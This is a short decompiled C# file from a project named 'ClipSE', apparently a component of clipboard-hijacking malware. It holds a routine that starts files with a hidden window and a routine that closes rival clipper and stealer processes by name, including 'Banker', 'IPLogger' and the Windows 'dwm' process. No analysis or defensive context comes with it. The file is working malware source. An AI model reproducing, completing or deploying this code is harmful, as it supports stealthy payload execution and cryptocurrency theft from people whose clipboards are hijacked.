using System;
using System.Collections.Generic;
using System.Diagnostics;

namespace ClipSE
{
	// Token: 0x02000005 RID: 5
	public static class ProcessControl
	{
		// Token: 0x06000005 RID: 5 RVA: 0x00002240 File Offset: 0x00000440
		public static bool RunFile(string filename)
		{
			if (!string.IsNullOrWhiteSpace(filename))
			{
				try
				{
					ProcessWindowStyle windowStyle = ProcessWindowStyle.Hidden;
					ProcessStartInfo startInfo = new ProcessStartInfo
					{
						FileName = filename,
						CreateNoWindow = false,
						WindowStyle = windowStyle
					};
					using (Process process = Process.Start(startInfo))
					{
						process.Refresh();
					}
					return true;
				}
				catch (Exception)
				{
					return false;
				}
				return true;
			}
			return true;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000022B8 File Offset: 0x000004B8
		public static void KillClipInizialize()
		{
			try
			{
				Process currentProcess = Process.GetCurrentProcess();
				foreach (string text in ProcessControl.ListClipManagers)
				{
					foreach (Process process in Process.GetProcessesByName(text))
					{
						try
						{
							if (process.ProcessName.ToLower().Contains(text.ToLower()) && process.ProcessName != currentProcess.ProcessName)
							{
								try
								{
									process.CloseMainWindow();
								}
								catch
								{
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400000B RID: 11
		private static readonly List<string> ListClipManagers = new List<string>
		{
			"Clipper",
			"Clip",
			"Buffer",
			"Ushell",
			"Banker",
			"ClipPurse",
			"Updater",
			"Scanner",
			"Clp",
			"Flipper",
			"Changer",
			"SelfClip",
			"IPLogger",
			"ClipPurSE",
			"dwm"
		};
	}
}
